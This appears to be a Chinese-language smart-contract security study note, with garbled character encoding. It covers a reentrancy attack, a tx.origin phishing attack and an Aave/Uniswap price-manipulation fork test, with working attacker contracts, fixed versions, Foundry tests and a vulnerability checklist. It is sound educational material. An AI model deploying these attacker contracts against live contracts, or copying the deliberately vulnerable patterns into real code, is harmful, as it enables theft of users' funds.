## ğŸ“… ç¬¬ 3 å‘¨ï¼šå®‰å…¨æ”»é˜²å®æˆ˜

ç›®æ ‡ï¼šç†è§£å¹¶é˜²å¾¡å¸¸è§æ¼æ´ã€‚

---

## **D15-D16 â€” é‡å…¥æ”»å‡»**

- ç¼–å†™å¯é‡å…¥ææ¬¾åˆçº¦
- å†™æ”»å‡»åˆçº¦å¹¶ç›—å–èµ„é‡‘
- ä½¿ç”¨Â `ReentrancyGuard`Â ä¿®å¤ & æµ‹è¯•

--------

### ç¤ºä¾‹ä»£ç 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

/*
 * å­˜åœ¨æ¼æ´çš„åˆçº¦
 */
contract VulnerableBank {

    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    /*
     * å…ˆå‘ msg.sender å‘èµ·è½¬è´¦ã€‚
     * å† balances[msg.sender] è¿›è¡Œæ‰£å‡
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        // msg.sender æ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒå˜é‡ï¼Œå®ƒä»£è¡¨**â€œå½“å‰å‡½æ•°è°ƒç”¨çš„ç›´æ¥è°ƒç”¨æ–¹â€**ã€‚
        // åœ¨é‡å…¥æ”»å‡»çš„ä¾‹å­ä¸­ï¼Œmsg.sender æ˜¯æ”»å‡»åˆçº¦åœ°å€ï¼Œè€Œä¸æ˜¯å‘èµ·äººçš„è´¦æˆ·åœ°å€
        // âŒ æ¼æ´ï¼šå…ˆè½¬è´¦ï¼Œåæ›´æ–°çŠ¶æ€
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");

        // å¦‚æœå‡ºç°è´Ÿæ•°ï¼Œæ—§ç‰ˆæœ¬ Solidityï¼ˆ<0.8.0ï¼‰ä¸­ï¼Œè¿™ç§ä¸‹æº¢ä¸ä¼šæŠ¥é”™
        // åœ¨ Solidity 0.8.0+ ç‰ˆæœ¬ä¸­ï¼Œè¿™ç§æƒ…å†µä¼šè§¦å‘ panic é”™è¯¯å¹¶ revert æ•´ä¸ªè°ƒç”¨ã€‚
        // 0 - 1 ether ä¼šç›´æ¥æŠ›å‡º Panic(uint256) å¼‚å¸¸ï¼ˆerror code 0x11ï¼‰ï¼Œè‡ªåŠ¨å›æ»šäº¤æ˜“
//        balances[msg.sender] -= amount;

        // åœ¨ unchecked å—é‡Œæ‰£ä½™é¢ â†’ å°±ä¸ä¼šå› ä¸ºä¸‹æº¢è€Œ revert
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./VulnerableBank.sol";
/**
 * æ”»å‡»è€…åˆçº¦ï¼ˆé‡å…¥æ”»å‡»ï¼‰
 */
contract Attacker {

    // æ¼æ´åˆçº¦
    VulnerableBank public bank;
    // æ”»å‡»åˆçº¦ å‘èµ·è€…
    address public owner;
    bool public attacking;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
        owner = msg.sender;
    }

    function attackDeposit() external payable {
        require(msg.sender == owner, "Not owner");
        // æ”»å‡»åˆçº¦ å­˜é’±
        bank.deposit{value: msg.value}();
    }

    function attackWithdraw() external {
        require(msg.sender == owner, "Not owner");
        attacking = true;

        // æŸ¥çœ‹æ”»å‡»åˆçº¦çš„è´¦æˆ·
        uint256 myBal = bank.getBalance();
        require(myBal > 0, "No balance to withdraw");

        // æ”»å‡»åˆçº¦è¿›è¡Œå–é’±
        bank.withdraw(myBal);
    }

    // é‡å…¥é’©å­
    receive() external payable {
        if (attacking) {
            // bank çš„ä½™é¢
            uint256 bankEth = address(bank).balance;

            // testAttackSucceeds ä½¿ç”¨
            // æ”»å‡»åˆçº¦ æŒæœ‰ bank çš„ä½™é¢
            uint256 myLogical = bank.getBalance();
            if (bankEth > 0) {
                uint256 amount = bankEth < myLogical ? bankEth : myLogical;
                bank.withdraw(amount);
            } else {
                attacking = false;
                // æ¥å—è¿™æ˜¯ owner
                // è°ƒç”¨è€…æ˜¯ å½“å‰åˆçº¦
                payable(owner).transfer(address(this).balance);
            }

            // testSecureBankResistsAttack ä½¿ç”¨
            // æ”»å‡»åˆçº¦ æŒæœ‰ bank çš„ä½™é¢
            // ç›´æ¥å¿½ç•¥ myLogical æˆ–å…è®¸ä¸º 0 ï¼Œä»¥ä¾¿è¿›å…¥é‡å…¥æ”»å‡»
//            if (bankEth > 0) {
//                uint256 amount = bankEth; // æˆ–å›ºå®šæ”»å‡»é¢åº¦
//                bank.withdraw(amount);
//            } else {
//                attacking = false;
//                // æ¥å—è¿™æ˜¯ owner
//                // è°ƒç”¨è€…æ˜¯ å½“å‰åˆçº¦
//                payable(owner).transfer(address(this).balance);
//            }
        }
    }
}
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * ä¿®å¤åçš„å®‰å…¨åˆçº¦
 */
contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        // âœ… ä¿®å¤ï¼šå…ˆæ›´æ–°çŠ¶æ€ï¼Œå†è½¬è´¦
        balances[msg.sender] -= amount;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");
    }
}
```

--------

### æµ‹è¯•ä»£ç 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../contracts/day15/Attacker.sol";
import "../../contracts/day15/SecureBank.sol";
import "../../contracts/day15/VulnerableBank.sol";
import "forge-std/Test.sol";


contract ReentrancyTest is Test {

    VulnerableBank public vulnerableBank;
    SecureBank public secureBank;
    Attacker public attacker;
    address public user;
    address public attackerAddr;

    function setUp() public {
        user = address(0xAAA);
        attackerAddr = address(0xBBB);

        // éƒ¨ç½²åˆçº¦
        vulnerableBank = new VulnerableBank();
        secureBank = new SecureBank();

        vm.deal(user, 10 ether);
        vm.deal(attackerAddr, 3 ether);

        // ç”¨æˆ·å­˜å…¥ 10 ether
        vm.prank(user);
        vulnerableBank.deposit{value: 10 ether}();

        // éƒ¨ç½²æ”»å‡»åˆçº¦
        vm.prank(attackerAddr);
        attacker = new Attacker(address(vulnerableBank));

        // æ”»å‡»è€…å­˜å…¥èµ„é‡‘
        vm.prank(attackerAddr);
        attacker.attackDeposit{value: 3 ether}();
    }

    /**
     * forge test --match-test testAttackSucceeds -vvvv
     */
    function testAttackSucceeds() public {
        // bank ä¸Šçš„ä½™é¢
        uint256 beforeBalance = address(vulnerableBank).balance;
        // æ”»å‡»äººåˆçº¦ä½™é¢
        uint256 beforeAttackerAddrBalance = attackerAddr.balance;
        // æ”»å‡»åˆçº¦ä½™é¢
        uint256 beforeAttackerBalance = address(attacker).balance;

        vm.prank(attackerAddr);
        attacker.attackWithdraw();

        // bank ä¸Šçš„ä½™é¢
        uint256 afterBalance = address(vulnerableBank).balance;
        // æ”»å‡»äººåˆçº¦ä½™é¢
        uint256 afterAttackerAddrBalance = attackerAddr.balance;
        // æ”»å‡»åˆçº¦ä½™é¢
        uint256 afterAttackerBalance = address(attacker).balance;

        emit log_named_uint("Attacker addr before", beforeAttackerAddrBalance);
        emit log_named_uint("Attacker addr after", afterAttackerAddrBalance);

        emit log_named_uint("Bank before", beforeBalance);
        emit log_named_uint("Bank after", afterBalance);

        emit log_named_uint("Attacker contract before", beforeAttackerBalance);
        emit log_named_uint("Attacker contract after", afterAttackerBalance);


        assertEq(afterBalance, 0, "Bank drained");
    }

    /**
     *  forge test --match-test testSecureBankResistsAttack -vvvv
     */
    function testSecureBankResistsAttack() public {
        vm.deal(user, 10 ether);
        vm.deal(attackerAddr, 1 ether);

        vm.prank(user);
        secureBank.deposit{value: 5 ether}();

        vm.prank(attackerAddr);
        Attacker attackerSecure = new Attacker(address(secureBank));

        vm.prank(attackerAddr);
        attackerSecure.attackDeposit{value: 1 ether}();

        vm.prank(attackerAddr);
        vm.expectRevert(); // nonReentrant ä¼šé˜»æ­¢é‡å…¥
        attackerSecure.attackWithdraw();
    }
}
```

--------

### æ€»ç»“

åœ¨ æ—§ç‰ˆæœ¬ Solidityï¼ˆ<0.8.0ï¼‰ä¸­ï¼Œæ•´æ•°ä¼šå‡ºç°ä¸‹æº¢ç°è±¡ï¼Œä¸”ä¸ä¼šæŠ¥é”™ã€‚åœ¨ Solidity 0.8.0+ ç‰ˆæœ¬ä¸­ï¼Œè¿™ç§æƒ…å†µä¼šè§¦å‘ panic é”™è¯¯å¹¶ revert æ•´ä¸ªè°ƒç”¨ã€‚

åœ¨ç¼–å†™æ”»å‡»åˆçº¦çš„æ—¶å€™ï¼Œä¹Ÿè¦æ³¨æ„å¯¹æ–¹åˆçº¦ä¸­çš„ä½™é¢ï¼Œå¦‚æœè¶…è¿‡ä½™é¢ä¹Ÿä¼šå‡ºç°revertã€‚

--------

## **D17 â€” tx.origin æ¼æ´**

- ç¼–å†™ä¾èµ–Â `tx.origin`Â çš„æƒé™éªŒè¯åˆçº¦
- ç¼–å†™æ”»å‡»è€…åˆçº¦ç»•è¿‡éªŒè¯



åœ¨ Solidity é‡Œï¼Œ

- `msg.sender`ï¼šå½“å‰ç›´æ¥è°ƒç”¨åˆçº¦çš„åœ°å€ï¼ˆå¯ä»¥æ˜¯å¤–éƒ¨è´¦å·æˆ–åˆçº¦ï¼‰
- `tx.origin`ï¼šäº¤æ˜“çš„**æœ€åˆå‘èµ·è€…**çš„å¤–éƒ¨è´¦æˆ·åœ°å€

å¦‚æœç”¨ `tx.origin` æ¥åšæƒé™éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸­é—´åˆçº¦è¯±å¯¼ä½ è°ƒç”¨ï¼Œä»è€Œå†’å……ä½ çš„èº«ä»½å»æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼ˆä¾‹å¦‚è½¬è´¦ï¼‰ã€‚

--------

### ç¤ºä¾‹ä»£ç 

```solidity
/**
 * æ¼æ´ç¤ºä¾‹åˆçº¦: ä½¿ç”¨ tx.origin åˆ¤æ–­æƒé™çš„é“¶è¡Œåˆçº¦ï¼ˆæœ‰æ¼æ´ï¼‰
 */
contract TxOriginBank {
    address public owner;

    constructor() {
        owner = msg.sender; // éƒ¨ç½²è€…æ˜¯é“¶è¡Œæ‹¥æœ‰è€…
    }

    // ä½¿ç”¨ tx.origin åˆ¤æ–­æƒé™ï¼ˆæœ‰æ¼æ´ï¼‰
    /*
        ğŸ’¥ æ¼æ´åŸå› ï¼š
            å¦‚æœ tx.origin == ownerï¼Œå³äº¤æ˜“æœ€åˆçš„å‘èµ·è€…æ˜¯ ownerï¼Œå°±å…è®¸æ‰§è¡Œè½¬è´¦ã€‚
            ä½†å¦‚æœ owner è°ƒç”¨äº†ä¸€ä¸ªæ¶æ„åˆçº¦ï¼Œè€Œè¯¥åˆçº¦å†è°ƒç”¨æ­¤å‡½æ•°ï¼Œtx.origin ä»ç„¶æ˜¯ ownerï¼ŒéªŒè¯ä¼šè¢«ç»•è¿‡ã€‚
     */
    function transferAll(address payable _to) public {
        require(tx.origin == owner, "Not owner"); // âš ï¸ æ¼æ´ç‚¹
        (bool sent, ) = _to.call{value: address(this).balance}("");
        require(sent, "Transfer failed");
    }

    // å­˜æ¬¾å‡½æ•°ï¼Œæ–¹ä¾¿æ¼”ç¤º
    function deposit() public payable {}
}

```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./TxOriginBank.sol";

/**
 * æ”»å‡»è€…åˆçº¦ï¼šé’ˆå¯¹ä½¿ç”¨ tx.origin åˆ¤æ–­æƒé™çš„åˆçº¦å‘èµ·æ”»å‡»
 */
contract TxOriginAttack {
    TxOriginBank public bank;
    address payable public attacker;

    constructor(address _bankAddress) {
        bank = TxOriginBank(_bankAddress);
        attacker = payable(msg.sender);
    }

    // è¯±å¯¼ Owner è°ƒç”¨è¯¥å‡½æ•°
    function attack() public {
        // è¿™é‡Œä¸æ˜¯ owner ä¹Ÿè¡Œï¼Œåªè¦ tx.origin æ˜¯ owner
        bank.transferAll(attacker);
    }
}

```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
/**
 * å®‰å…¨é“¶è¡Œåˆçº¦ï¼ˆæ— æ¼æ´ç¤ºä¾‹ï¼‰
 */
contract SafeBank {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function transferAll(address payable _to) public {
        // ä¿®å¤ï¼šåªå…è®¸ç›´æ¥è°ƒç”¨è€…æ˜¯ owner
        require(msg.sender == owner, "Not owner");
        (bool sent, ) = _to.call{value: address(this).balance}("");
        require(sent, "Transfer failed");
    }

    function deposit() public payable {}
}

```



### æµ‹è¯•ä»£ç 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../contracts/day17/SafeBank.sol";
import "../../contracts/day17/TxOriginAttack.sol";
import "../../contracts/day17/TxOriginBank.sol";
import "forge-std/Test.sol";


contract TxOriginTest is Test {

    TxOriginBank vulnBank;
    TxOriginAttack attacker;
    SafeBank safeBank;

    address alice = address(0x1); // owner
    address eve = address(0x2);   // attacker

    function setUp() public {
        vm.deal(alice, 5 ether);
        vm.deal(eve, 1 ether);

        vm.startPrank(alice);
        vulnBank = new TxOriginBank();

        safeBank = new SafeBank();
        vm.stopPrank();

        // é“¶è¡Œå……å€¼
        vm.prank(alice);
        vulnBank.deposit{value: 5 ether}();

        console.log("alice is:", address(alice));
        address currentOwner = vulnBank.owner(); // ç›´æ¥è°ƒç”¨ getter
        console.log("TxOriginBank owner is:", currentOwner);
        console.log("TxOriginBank bank is:", address(vulnBank));
        console.log("TxOriginBank Balance", address(vulnBank).balance);
    }

    /*
     * forge test --match-test testTxOriginAttack -vvvv
     */
    function testTxOriginAttack() public {
        console.log("---------------- testTxOriginAttack ----------------");
        // Eve éƒ¨ç½²æ”»å‡»åˆçº¦
        vm.prank(eve);
        attacker = new TxOriginAttack(address(vulnBank));

        console.log("testTxOriginAttack TxOriginBank bank is:", address(vulnBank));
        console.log("testTxOriginAttack TxOriginAttack bank is:", address(attacker));

        address currentOwner = vulnBank.owner(); // ç›´æ¥è°ƒç”¨ getter
        console.log("TxOriginBank owner is:", currentOwner);

        // è¯±å¯¼ Alice å‘èµ·è°ƒç”¨
        vm.prank(alice, alice);
        console.log("tx.origin is:", tx.origin);
        attacker.attack();

        console.log("testTxOriginAttack TxOriginBank Balance", address(vulnBank).balance);
        console.log("testTxOriginAttack TxOriginAttack TxOriginAttack bank is:", address(attacker).balance);

        assertEq(address(vulnBank).balance, 0);

    }

    function testSafeBankNoAttack() public {
        // Eve éƒ¨ç½²æ”»å‡»åˆçº¦é’ˆå¯¹ SafeBankï¼ˆä¼šå¤±è´¥ï¼‰
        vm.prank(eve);
        TxOriginAttack badAttack = new TxOriginAttack(address(safeBank));

        // Alice è°ƒç”¨ä¹Ÿä¸ä¼šé€šè¿‡ msg.sender æ£€æŸ¥
        vm.expectRevert();
        vm.prank(alice);
        badAttack.attack();
    }
}
```



--------

## **D18-D19 â€” ä»·æ ¼æ“çºµæ”»å‡»**

- **Foundry** Fork ä¸»ç½‘ Uniswap
- å†™è„šæœ¬æ“çºµä»·æ ¼ï¼Œå¯¼è‡´å€Ÿè´·å¹³å°é”™è¯¯æ¸…ç®—

--------

### æ”»å‡»åŸç†

ä»·æ ¼æ“çºµæ”»å‡»çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨ **AMMï¼ˆè‡ªåŠ¨åŒ–åšå¸‚å•†ï¼‰ä»·æ ¼ç¬æ—¶æ³¢åŠ¨** æ¥è¯¯å¯¼å€Ÿè´·å¹³å°çš„æ¸…ç®—é€»è¾‘ï¼š

- **AMM å®šä»·å…¬å¼**ï¼ˆä»¥ Uniswap v2 ä¸ºä¾‹ï¼‰ï¼š
  $$
  price=reserveWETH/reserveTOKEN
  $$

- å¦‚æœæ”»å‡»è€…ç”¨å¤§é‡èµ„é‡‘ï¼ˆé€šå¸¸æ¥è‡ªé—ªç”µè´·ï¼‰ä¹°å…¥æˆ–å–å‡ºæŸ tokenï¼Œä¼šä¸´æ—¶æ”¹å˜å‚¨å¤‡æ¯”ä¾‹ â†’ ä»·æ ¼è¿…é€Ÿå˜åŒ–ã€‚

- å€Ÿè´·å¹³å°ï¼ˆè‹¥ç›´æ¥ç”¨ Uniswap å³æ—¶ä»·æ ¼ä½œé¢„è¨€æœºï¼‰ä¼šï¼š

  - é«˜ä¼°æŠµæŠ¼å“ä»·å€¼ â†’ æ”»å‡»è€…å¯å€Ÿå‡ºæ›´å¤šèµ„äº§
  - ä½ä¼°æŠµæŠ¼å“ä»·å€¼ â†’ è§¦å‘åˆ«äººæŠµæŠ¼èµ„äº§çš„æ¸…ç®—ï¼ˆæ”»å‡»è€…å¯ä½ä»·æ¥æ”¶ï¼‰

- æ”»å‡»ç»“æŸåï¼Œæ”»å‡»è€…åå‘äº¤æ˜“æ¢å¤ä»·æ ¼ï¼Œå¹¶å¿è¿˜é—ªç”µè´·ï¼Œç•™å–å¥—åˆ©åˆ©æ¶¦ã€‚

--------

### æµ‹è¯•ä»£ç 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// ===== Aave v2 LendingPool å®˜æ–¹æ¥å£(ç®€åŒ–ç‰ˆ) =====
interface IAaveV2LendingPool {
    function deposit(
        address asset,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function withdraw(
        address asset,
        uint256 daiBal,
        address attacker
    ) external;

    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralETH,
        uint256 totalDebtETH,
        uint256 availableBorrowsETH,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    );
}

/// ===== Uniswap V2 Routeréƒ¨åˆ†æ¥å£ =====
interface IUniswapV2Router02 {
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

/// ===== Aave v2 LendingPoolAddressesProvider æ¥å£ =====
interface ILendingPoolAddressesProvider {
    function getLendingPool() external view returns (address);
}

contract PriceManipulationTest is Test {

    IUniswapV2Router02 router;
    IERC20 token;
    address WETH;
    IAaveV2LendingPool lending;
    address attacker;

    function setUp() public {
        // ä¸»ç½‘ Uniswap V2 Router
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        // æˆ‘ä»¬ç”¨ DAI ä½œä¸ºæŠµæŠ¼èµ„äº§
        token = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); // DAI

        // é€šè¿‡ Aave v2 AddressesProvider è·å–æœ€æ–° LendingPool åœ°å€
        ILendingPoolAddressesProvider provider =
                        ILendingPoolAddressesProvider(0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5);

        address lendingPoolAddr = provider.getLendingPool();
        console.log("Fetched Aave v2 LendingPool Address:", lendingPoolAddr);

        lending = IAaveV2LendingPool(lendingPoolAddr);

        // ä¸»ç½‘ WETH åœ°å€
        WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

        // æ”»å‡»è€…è´¦å·
        attacker = address(this);
        vm.deal(attacker, 500 ether);
    }

    /*
     *  forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/<ä½ çš„API> --fork-block-number 16700000  --match-test testPriceManipulationAttack -vvv
     *
     *  å¤‡æ³¨ï¼šå½“å‰ä¾‹å­ä¸­ï¼Œç›‘æ§ç³»æ•°ä¼šå¯¼è‡´æ”»å‡»å¤±è´¥ï¼Œéœ€è¦éƒ¨ç½²ä¸€ä¸ªå¼±é¢„è¨€æœºçš„å€Ÿè´·åˆçº¦
     */
    function testPriceManipulationAttack() public {
        vm.startPrank(attacker);

        // æ‰¹å‡† Uniswap Router å’Œ Aave LendingPool æ“ä½œä»£å¸
        token.approve(address(router), type(uint256).max);
        token.approve(address(lending), type(uint256).max);

        /** â‘  æ“çºµä»·æ ¼ï¼šç”¨å¤§é‡ ETH æ¢ DAI **/
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(token);

        router.swapExactETHForTokens{value: 400 ether}(
            0,
            path,
            attacker,
            block.timestamp + 300
        );

        uint256 daiBal = token.balanceOf(attacker);
        console.log("Bought DAI:", daiBal);

        /** â‘¡ å­˜å…¥æŠµæŠ¼å“ **/
        lending.deposit(address(token), daiBal, attacker, 0);

        /** â‘¢ å€Ÿå‡º WETH */
        lending.borrow(WETH, 100 ether, 2, 0, attacker);

        /** â‘£ å–å›æŠµæŠ¼å“ï¼ˆwithdraw ä¿®å¤ä½™é¢ä¸è¶³é—®é¢˜ï¼‰ **/
        lending.withdraw(address(token), daiBal, attacker);

        /** â‘¤ å–å‡º DAI æ¢å¤ä»·æ ¼ **/
        path[0] = address(token);
        path[1] = WETH;

        router.swapExactTokensForETH(
            daiBal,
            0,
            path,
            attacker,
            block.timestamp + 300
        );

        vm.stopPrank();

        console.log("Final ETH balance of attacker:", attacker.balance);
    }
}
```





--------

## **D20 â€” å®¡è®¡æ¸…å•**

- å†™ä¸€ä»½å¸¸è§æ¼æ´ checklistï¼ˆè‡³å°‘ 10 æ¡ï¼‰

---------

### **1. é‡å…¥æ”»å‡» (Reentrancy)**

- åœ¨è°ƒç”¨å¤–éƒ¨åˆçº¦å‰æœªæ›´æ–°çŠ¶æ€å˜é‡æˆ–ä½™é¢è®°å½•ã€‚
- å¸¸è§äº `withdraw`ã€`transfer`ã€`call` ç­‰å‡½æ•°ã€‚
- é˜²æŠ¤ï¼š
  - ä½¿ç”¨ **Checks-Effects-Interactions** æ¨¡å¼ã€‚
  - æˆ–åº”ç”¨ `ReentrancyGuard`ã€‚

```solidity
   function withdraw() external {
        require(balances[msg.sender] > 0, "No balance");
        (bool ok, ) = msg.sender.call{value: balances[msg.sender]}("");
        // **æ¼æ´ç‚¹**: çŠ¶æ€æ›´æ–°åœ¨èµ„é‡‘è½¬ç§»ä¹‹å
        balances[msg.sender] = 0;
    }
```

--------

### **2. æœªéªŒè¯è¾“å…¥å‚æ•°**

- `address(0)` ä½œä¸ºç”¨æˆ·åœ°å€æˆ–é‡è¦å‚æ•°ã€‚
- æœªæ£€æŸ¥æ•°ç»„é•¿åº¦ã€ç´¢å¼•èŒƒå›´ã€‚
- é˜²æŠ¤ï¼š
  - æ˜ç¡®å‚æ•°éªŒè¯é€»è¾‘ã€‚
  - ä½¿ç”¨ `require()` æ£€æŸ¥è¾¹ç•Œã€‚

```solidity
    function setReward(address user, uint256 amount) external {
        // **æ¼æ´ç‚¹**: æ²¡æœ‰æ£€æŸ¥ user åœ°å€æ˜¯å¦ä¸º 0
        // å­˜å‚¨åœ¨ address(0) æˆ–æ— æ•ˆåœ°å€ï¼Œå¯¼è‡´èµ„é‡‘ä¸å¯å–å›ã€‚
        rewards[user] = amount;
    }
```

---------

### **3. æƒé™æ§åˆ¶ç¼ºå¤± / æƒé™è¿‡å¤§**

- é‡è¦å‡½æ•°ç¼ºå°‘ `onlyOwner` / `onlyAdmin` é™åˆ¶ã€‚
- ç®¡ç†å‘˜æƒé™è¿‡äºé›†ä¸­ï¼Œå¯ç›´æ¥å‡çº§æˆ–é“¸å¸ã€‚
- é˜²æŠ¤ï¼š
  - æ£€æŸ¥æ‰€æœ‰ `public`/`external` æ–¹æ³•çš„è®¿é—®æ§åˆ¶ã€‚
  - åˆ†æƒæ²»ç†ã€‚

```solidity
    function mint(address to, uint256 amount) external {
        // **æ¼æ´ç‚¹**: ä»»æ„äººéƒ½å¯ä»¥è°ƒç”¨
        balances[to] += amount;
    }
```

--------

### **4. æ—¶é—´æˆ³ä¾èµ–**

- ä½¿ç”¨ `block.timestamp` è¿›è¡Œå…³é”®é€»è¾‘åˆ¤æ–­ï¼ˆå¦‚éšæœºæ•°ã€é”å®šæ—¶é—´ï¼‰å¯èƒ½è¢«çŸ¿å·¥æ“æ§ã€‚
- é˜²æŠ¤ï¼š
  - å¯¹æ—¶é—´å®¹å¿èŒƒå›´ â‰¥ 15 ç§’ã€‚
  - ä¸ç”¨äºé«˜é£é™©éšæœºæ•°ç”Ÿæˆã€‚

```solidity
    function win() public view returns (bool) {
        // **æ¼æ´ç‚¹**: block.timestamp å¯è¢«çŸ¿å·¥æ“æ§å‡ ç§’
        return block.timestamp % 2 == 0;
    }
```

--------

### **5. æ•´æ•°æº¢å‡º / ä¸‹æº¢**

- åœ¨ Solidity < 0.8 ä¸­å¯èƒ½å‡ºç°åŠ å‡ä¹˜è¶Šç•Œã€‚
- é˜²æŠ¤ï¼š
  - ä½¿ç”¨ Solidity >= 0.8ï¼ˆå†…ç½®æº¢å‡ºæ£€æŸ¥ï¼‰ã€‚
  - æˆ–ä½¿ç”¨ `SafeMath` åº“ã€‚

```solidity
contract Overflow {
    uint8 public count = 255;
    function inc() public { count += 1; } // æº¢å‡ºå˜æˆ 0
}
```

---------

### **6. å¯å‡çº§åˆçº¦æ¼æ´**

- Proxy å­˜å‚¨æ§½å†²çªã€‚
- åˆå§‹åŒ–å‡½æ•°å¯è¢«é‡å¤è°ƒç”¨ï¼ˆ`initialize()` æ²¡æœ‰é˜²é‡å¤ä¿®é¥°ï¼‰ã€‚
- é˜²æŠ¤ï¼š
  - ç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„å­˜å‚¨å¸ƒå±€ã€‚
  - åœ¨ `initialize` å‡½æ•°ä¸­ä½¿ç”¨ `initializer` ä¿®é¥°å™¨ã€‚

```solidity
pragma solidity ^0.8.0;

contract StorageV1 {
    uint256 public value;
}

contract StorageV2 {
    uint256 public newValue;
    uint256 public value; // **æ¼æ´ç‚¹**: å­˜å‚¨é¡ºåºæ”¹å˜
}
```

--------

### **7. ä»·æ ¼æ“çºµï¼ˆé¢„è¨€æœºä¾èµ–é£é™©ï¼‰**

- åè®®ç›´æ¥ä½¿ç”¨å•ä¸€ AMMï¼ˆUniswap/Sushiswapï¼‰ä»·æ ¼è€Œæ— ä»·æ ¼ä¿æŠ¤ã€‚
- é˜²æŠ¤ï¼š
  - ä½¿ç”¨é“¾ä¸Šå–‚ä»·èšåˆï¼ˆChainlinkï¼‰ã€‚
  - æ·»åŠ ä»·æ ¼æ›´æ–°å»¶è¿Ÿæˆ– TWAPã€‚

```solidity
interface IUniswap { function getPrice() external view returns (uint256); }

contract Lending {
    IUniswap public priceFeed;
    function borrow(uint256 amount) external {
        // **æ¼æ´ç‚¹**: ç›´æ¥ä¿¡ä»»æ± å­ä»·æ ¼
        uint256 price = priceFeed.getPrice();
        // ...
    }
}
```

--------

### **8. é—ªç”µè´·å¯åˆ©ç”¨æ€§**

- åè®®åœ¨å•äº¤æ˜“ä¸­å®Œæˆ **è´¨æŠ¼ â†’ å€Ÿæ¬¾ â†’ æå–**ï¼Œä¸”ä»·æ ¼æ¥æºå¯æ“çºµã€‚
- é˜²æŠ¤ï¼š
  - åœ¨å€Ÿè´·å‰åæ£€éªŒä»·æ ¼å˜åŠ¨å¹…åº¦ã€‚
  - å¼•å…¥åŒºå—çº§ä»·æ ¼é”ã€‚

```solidity
contract Lend {
    mapping(address => uint256) public collateral;
    function deposit(uint256 amount) external { collateral[msg.sender] += amount; }
    function borrow(uint256 amount) external { /* æ£€æŸ¥ä¸è¶³ */ }
}
```

-------

### **9. å‰ç½®æ”»å‡»ï¼ˆFront-runningï¼‰**

- ç”¨æˆ·å…³é”®äº¤æ˜“ï¼ˆå¦‚æ‹å–ã€äº¤æ˜“æ’®åˆï¼‰å¯è¢«æŠ¢å…ˆæäº¤ã€‚
- é˜²æŠ¤ï¼š
  - ä½¿ç”¨æäº¤-æ­ç¤ºï¼ˆCommit-Revealï¼‰æœºåˆ¶ã€‚
  - å¢åŠ æ»‘ç‚¹ä¿æŠ¤ã€‚

```solidity
contract Auction {
    uint256 public highestBid;
    function bid(uint256 amount) external {
        require(amount > highestBid);
        highestBid = amount;
    }
}
```

--------

### **10. æ²¡æœ‰æˆ–é”™è¯¯çš„äº‹ä»¶æ—¥å¿—**

- å…³é”®ä¿¡æ¯ï¼ˆå¦‚è½¬è´¦ã€çŠ¶æ€å˜æ›´ï¼‰æœª emit äº‹ä»¶ï¼Œå¯¼è‡´é“¾ä¸Šè¿½è¸ªå›°éš¾æˆ–åˆçº¦äº¤äº’æ··ä¹±ã€‚
- é˜²æŠ¤ï¼š
  - åœ¨å…³é”®çŠ¶æ€å‡½æ•° emit å¯¹åº”äº‹ä»¶ã€‚
  - ç¡®ä¿äº‹ä»¶å‚æ•°å‡†ç¡®è®°å½•ã€‚

```solidity
contract Token {
    mapping(address => uint256) public balances;
    function transfer(address to, uint256 amount) external {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        // **æ¼æ´ç‚¹**: æœª emit äº‹ä»¶
    }
}
```

--------

### **11. é“¾ä¸‹ä¾èµ–ä¸å®‰å…¨**

